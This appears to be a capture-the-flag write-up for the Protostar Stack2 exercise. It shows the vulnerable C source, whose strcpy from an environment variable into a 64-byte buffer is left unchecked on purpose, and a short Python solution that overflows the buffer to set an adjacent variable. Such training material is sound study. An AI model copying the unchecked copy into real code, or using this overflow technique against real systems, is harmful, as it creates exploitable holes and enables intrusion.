#### Protostar Stack2 

##### About
Stack2 looks at environment variables, and how they can be set. 
  
This level is at /opt/protostar/bin/stack2

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

##### Solution
```
$ python
......
>>> import os
>>> envval = 'A'*64 + '\x0a\x0d\x0a\x0d'
>>> os.putenv("GREENIE", envval)
>>> os.system("./stack2")
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>
